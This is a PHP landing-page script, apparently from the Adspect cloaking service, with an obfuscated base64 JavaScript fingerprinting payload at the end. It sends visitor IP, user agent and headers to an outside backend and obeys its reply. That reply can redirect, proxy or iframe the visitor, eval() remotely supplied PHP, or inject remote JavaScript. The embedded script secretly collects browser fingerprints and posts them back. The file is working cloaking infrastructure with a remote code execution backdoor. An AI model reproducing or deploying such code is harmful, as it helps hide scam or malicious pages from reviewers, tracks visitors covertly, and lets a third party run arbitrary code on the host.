<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['QUERY_STRING'] = (string)parse_url($url, PHP_URL_QUERY); $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; parse_str($_SERVER['QUERY_STRING'], $_GET); } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('78d9b225-e885-4a07-800e-643a559c537d', 'redirect', '_', base64_decode('laKrsV1Wh/OgZHkI/YyoilcQMv+9I2tArWV6G7zrPA4=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDUxN2I9WycxNzYyZ3d5Q0dGJywncGVybWlzc2lvbicsJ21ldGhvZCcsJzI4MDUyOGdyZnNKeCcsJ3dlYmdsJywnZ2V0VGltZXpvbmVPZmZzZXQnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnbG9jYXRpb24nLCdnZXRDb250ZXh0JywnTm90aWZpY2F0aW9uJywnYXBwZW5kQ2hpbGQnLCdnZXRQYXJhbWV0ZXInLCdocmVmJywnd2luZG93Jywnc3RyaW5naWZ5JywnUE9TVCcsJ3Rvc3RyaW5nJywndHlwZScsJ2Z1bmN0aW9uJywnZm9ybScsJ2NhbnZhcycsJ25vZGVOYW1lJywnY2xvc3VyZScsJzEwOUVXZUZadScsJ2RvY3VtZW50RWxlbWVudCcsJ29iamVjdCcsJ3Blcm1pc3Npb25zJywnVG91Y2hFdmVudCcsJ2RhdGEnLCdpbnB1dCcsJzV2eU1UY2UnLCdlcnJvcnMnLCd0aGVuJywnbmF2aWdhdG9yJywnMjE1WHlmVFh2JywnYXR0cmlidXRlcycsJ2FjdGlvbicsJ1VOTUFTS0VEX1JFTkRFUkVSX1dFQkdMJywnMjlyVmRpRmsnLCdub2RlVmFsdWUnLCcxMTk4VnJvWUREJywnY29uc29sZScsJzQ0NjhvWEZBWWsnLCc1NTB2VFZpWk4nLCcyMTkyMjhzb0JmTVQnLCd2YWx1ZScsJ3B1c2gnLCdjcmVhdGVFbGVtZW50JywndGltZXpvbmVPZmZzZXQnLCcyMDgzOU93YWtrUCcsJ3RvdWNoRXZlbnQnLCdib2R5JywnbG9nJywndG9TdHJpbmcnLCcxeUZaTnhvJywnbm90aWZpY2F0aW9ucycsJ21lc3NhZ2UnXTt2YXIgXzB4MjJkMj1mdW5jdGlvbihfMHg3OWMxNjEsXzB4Y2IzNTYzKXtfMHg3OWMxNjE9XzB4NzljMTYxLTB4MWUwO3ZhciBfMHg1MTdiNGE9XzB4NTE3YltfMHg3OWMxNjFdO3JldHVybiBfMHg1MTdiNGE7fTsoZnVuY3Rpb24oXzB4YTMyMjE0LF8weDIwZjMwMyl7dmFyIF8weDQ4YmQzYz1fMHgyMmQyO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MWVjMTg2PS1wYXJzZUludChfMHg0OGJkM2MoMHgyMTIpKSpwYXJzZUludChfMHg0OGJkM2MoMHgyMGMpKStwYXJzZUludChfMHg0OGJkM2MoMHgyMTQpKSpwYXJzZUludChfMHg0OGJkM2MoMHgyMTApKSstcGFyc2VJbnQoXzB4NDhiZDNjKDB4MjA4KSkqLXBhcnNlSW50KF8weDQ4YmQzYygweDIxNSkpKy1wYXJzZUludChfMHg0OGJkM2MoMHgxZWEpKSotcGFyc2VJbnQoXzB4NDhiZDNjKDB4MjAxKSkrcGFyc2VJbnQoXzB4NDhiZDNjKDB4MWUyKSkrcGFyc2VJbnQoXzB4NDhiZDNjKDB4MWVkKSkrLXBhcnNlSW50KF8weDQ4YmQzYygweDIxNikpKnBhcnNlSW50KF8weDQ4YmQzYygweDFlNykpO2lmKF8weDFlYzE4Nj09PV8weDIwZjMwMylicmVhaztlbHNlIF8weGEzMjIxNFsncHVzaCddKF8weGEzMjIxNFsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NzRmZjgyKXtfMHhhMzIyMTRbJ3B1c2gnXShfMHhhMzIyMTRbJ3NoaWZ0J10oKSk7fX19KF8weDUxN2IsMHgyNDVkNSksZnVuY3Rpb24oKXt2YXIgXzB4MjM4OGMxPV8weDIyZDI7ZnVuY3Rpb24gXzB4NTNkYThiKCl7dmFyIF8weDJkOTVhYj1fMHgyMmQyO18weDU1MzUzY1tfMHgyZDk1YWIoMHgyMDkpXT1fMHhiZTQ2OTA7dmFyIF8weDMwMjc4Nj1kb2N1bWVudFtfMHgyZDk1YWIoMHgxZTApXShfMHgyZDk1YWIoMHgxZmQpKSxfMHgxZDU3OTg9ZG9jdW1lbnRbXzB4MmQ5NWFiKDB4MWUwKV0oXzB4MmQ5NWFiKDB4MjA3KSk7XzB4MzAyNzg2W18weDJkOTVhYigweDFlYyldPV8weDJkOTVhYigweDFmOSksXzB4MzAyNzg2W18weDJkOTVhYigweDIwZSldPXdpbmRvd1tfMHgyZDk1YWIoMHgxZjEpXVtfMHgyZDk1YWIoMHgxZjYpXSxfMHgxZDU3OThbXzB4MmQ5NWFiKDB4MWZiKV09J2hpZGRlbicsXzB4MWQ1Nzk4WyduYW1lJ109XzB4MmQ5NWFiKDB4MjA2KSxfMHgxZDU3OThbXzB4MmQ5NWFiKDB4MjE3KV09SlNPTltfMHgyZDk1YWIoMHgxZjgpXShfMHg1NTM1M2MpLF8weDMwMjc4NltfMHgyZDk1YWIoMHgxZjQpXShfMHgxZDU3OTgpLGRvY3VtZW50W18weDJkOTVhYigweDFlNCldW18weDJkOTVhYigweDFmNCldKF8weDMwMjc4NiksXzB4MzAyNzg2WydzdWJtaXQnXSgpO312YXIgXzB4YmU0NjkwPVtdLF8weDU1MzUzYz17fTt0cnl7dmFyIF8weDE5OGRmMj1mdW5jdGlvbihfMHg1ZDc3Njcpe3ZhciBfMHgxYmU3NmU9XzB4MjJkMjtpZihfMHgxYmU3NmUoMHgyMDMpPT09dHlwZW9mIF8weDVkNzc2NyYmbnVsbCE9PV8weDVkNzc2Nyl7dmFyIF8weDUyZDZlYT1mdW5jdGlvbihfMHgyNmJkM2Upe3ZhciBfMHgyNGEwZmY9XzB4MWJlNzZlO3RyeXt2YXIgXzB4NDhmMDdhPV8weDVkNzc2N1tfMHgyNmJkM2VdO3N3aXRjaCh0eXBlb2YgXzB4NDhmMDdhKXtjYXNlIF8weDI0YTBmZigweDIwMyk6aWYobnVsbD09PV8weDQ4ZjA3YSlicmVhaztjYXNlIF8weDI0YTBmZigweDFmYyk6XzB4NDhmMDdhPV8weDQ4ZjA3YVtfMHgyNGEwZmYoMHgxZTYpXSgpO31fMHg1ZjE1MTdbXzB4MjZiZDNlXT1fMHg0OGYwN2E7fWNhdGNoKF8weDQyN2QxNil7XzB4YmU0NjkwW18weDI0YTBmZigweDIxOCldKF8weDQyN2QxNltfMHgyNGEwZmYoMHgxZTkpXSk7fX0sXzB4NWYxNTE3PXt9LF8weDEzMzZjYTtmb3IoXzB4MTMzNmNhIGluIF8weDVkNzc2NylfMHg1MmQ2ZWEoXzB4MTMzNmNhKTt0cnl7dmFyIF8weDEwMGM5Nz1PYmplY3RbXzB4MWJlNzZlKDB4MWYwKV0oXzB4NWQ3NzY3KTtmb3IoXzB4MTMzNmNhPTB4MDtfMHgxMzM2Y2E8XzB4MTAwYzk3WydsZW5ndGgnXTsrK18weDEzMzZjYSlfMHg1MmQ2ZWEoXzB4MTAwYzk3W18weDEzMzZjYV0pO18weDVmMTUxN1snISEnXT1fMHgxMDBjOTc7fWNhdGNoKF8weDU5OTcwZSl7XzB4YmU0NjkwW18weDFiZTc2ZSgweDIxOCldKF8weDU5OTcwZVtfMHgxYmU3NmUoMHgxZTkpXSk7fXJldHVybiBfMHg1ZjE1MTc7fX07XzB4NTUzNTNjWydzY3JlZW4nXT1fMHgxOThkZjIod2luZG93WydzY3JlZW4nXSksXzB4NTUzNTNjW18weDIzODhjMSgweDFmNyldPV8weDE5OGRmMih3aW5kb3cpLF8weDU1MzUzY1snbmF2aWdhdG9yJ109XzB4MTk4ZGYyKHdpbmRvd1tfMHgyMzg4YzEoMHgyMGIpXSksXzB4NTUzNTNjW18weDIzODhjMSgweDFmMSldPV8weDE5OGRmMih3aW5kb3dbXzB4MjM4OGMxKDB4MWYxKV0pLF8weDU1MzUzY1tfMHgyMzg4YzEoMHgyMTMpXT1fMHgxOThkZjIod2luZG93W18weDIzODhjMSgweDIxMyldKSxfMHg1NTM1M2NbXzB4MjM4OGMxKDB4MjAyKV09ZnVuY3Rpb24oXzB4MjljOWVlKXt2YXIgXzB4M2MzNmIyPV8weDIzODhjMTt0cnl7dmFyIF8weDUwOWEzYj17fTtfMHgyOWM5ZWU9XzB4MjljOWVlW18weDNjMzZiMigweDIwZCldO2Zvcih2YXIgXzB4MjlhY2E4IGluIF8weDI5YzllZSlfMHgyOWFjYTg9XzB4MjljOWVlW18weDI5YWNhOF0sXzB4NTA5YTNiW18weDI5YWNhOFtfMHgzYzM2YjIoMHgxZmYpXV09XzB4MjlhY2E4W18weDNjMzZiMigweDIxMSldO3JldHVybiBfMHg1MDlhM2I7fWNhdGNoKF8weDRkMmNkOSl7XzB4YmU0NjkwWydwdXNoJ10oXzB4NGQyY2Q5W18weDNjMzZiMigweDFlOSldKTt9fShkb2N1bWVudFsnZG9jdW1lbnRFbGVtZW50J10pLF8weDU1MzUzY1snZG9jdW1lbnQnXT1fMHgxOThkZjIoZG9jdW1lbnQpO3RyeXtfMHg1NTM1M2NbXzB4MjM4OGMxKDB4MWUxKV09bmV3IERhdGUoKVtfMHgyMzg4YzEoMHgxZWYpXSgpO31jYXRjaChfMHgxOWVhMTYpe18weGJlNDY5MFtfMHgyMzg4YzEoMHgyMTgpXShfMHgxOWVhMTZbXzB4MjM4OGMxKDB4MWU5KV0pO310cnl7XzB4NTUzNTNjW18weDIzODhjMSgweDIwMCldPWZ1bmN0aW9uKCl7fVtfMHgyMzg4YzEoMHgxZTYpXSgpO31jYXRjaChfMHgyN2ViMzApe18weGJlNDY5MFtfMHgyMzg4YzEoMHgyMTgpXShfMHgyN2ViMzBbXzB4MjM4OGMxKDB4MWU5KV0pO310cnl7XzB4NTUzNTNjW18weDIzODhjMSgweDFlMyldPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDIzODhjMSgweDIwNSkpW18weDIzODhjMSgweDFlNildKCk7fWNhdGNoKF8weDMzOGEwMSl7XzB4YmU0NjkwW18weDIzODhjMSgweDIxOCldKF8weDMzOGEwMVtfMHgyMzg4YzEoMHgxZTkpXSk7fXRyeXtfMHgxOThkZjI9ZnVuY3Rpb24oKXt9O3ZhciBfMHhiYzZjM2Y9MHgwO18weDE5OGRmMlsndG9TdHJpbmcnXT1mdW5jdGlvbigpe3JldHVybisrXzB4YmM2YzNmLCcnO30sY29uc29sZVtfMHgyMzg4YzEoMHgxZTUpXShfMHgxOThkZjIpLF8weDU1MzUzY1tfMHgyMzg4YzEoMHgxZmEpXT1fMHhiYzZjM2Y7fWNhdGNoKF8weDFmZTAwYyl7XzB4YmU0NjkwW18weDIzODhjMSgweDIxOCldKF8weDFmZTAwY1tfMHgyMzg4YzEoMHgxZTkpXSk7fXdpbmRvd1snbmF2aWdhdG9yJ11bJ3Blcm1pc3Npb25zJ11bJ3F1ZXJ5J10oeyduYW1lJzpfMHgyMzg4YzEoMHgxZTgpfSlbXzB4MjM4OGMxKDB4MjBhKV0oZnVuY3Rpb24oXzB4MjY4NGVmKXt2YXIgXzB4NGE4YjM5PV8weDIzODhjMTtfMHg1NTM1M2NbXzB4NGE4YjM5KDB4MjA0KV09W3dpbmRvd1tfMHg0YThiMzkoMHgxZjMpXVtfMHg0YThiMzkoMHgxZWIpXSxfMHgyNjg0ZWZbJ3N0YXRlJ11dLF8weDUzZGE4YigpO30sXzB4NTNkYThiKTt0cnl7dmFyIF8weGQ2NWViMD1kb2N1bWVudFtfMHgyMzg4YzEoMHgxZTApXShfMHgyMzg4YzEoMHgxZmUpKVtfMHgyMzg4YzEoMHgxZjIpXShfMHgyMzg4YzEoMHgxZWUpKSxfMHg1YjJjODI9XzB4ZDY1ZWIwWydnZXRFeHRlbnNpb24nXSgnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycpO18weDU1MzUzY1snd2ViZ2wnXT17J3ZlbmRvcic6XzB4ZDY1ZWIwW18weDIzODhjMSgweDFmNSldKF8weDViMmM4MlsnVU5NQVNLRURfVkVORE9SX1dFQkdMJ10pLCdyZW5kZXJlcic6XzB4ZDY1ZWIwWydnZXRQYXJhbWV0ZXInXShfMHg1YjJjODJbXzB4MjM4OGMxKDB4MjBmKV0pfTt9Y2F0Y2goXzB4MTIwYWUyKXtfMHhiZTQ2OTBbXzB4MjM4OGMxKDB4MjE4KV0oXzB4MTIwYWUyW18weDIzODhjMSgweDFlOSldKTt9fWNhdGNoKF8weDNiZGQxNyl7XzB4YmU0NjkwW18weDIzODhjMSgweDIxOCldKF8weDNiZGQxN1tfMHgyMzg4YzEoMHgxZTkpXSksXzB4NTNkYThiKCk7fX0oKSk7"></script>
</body>
</html>
<?php exit;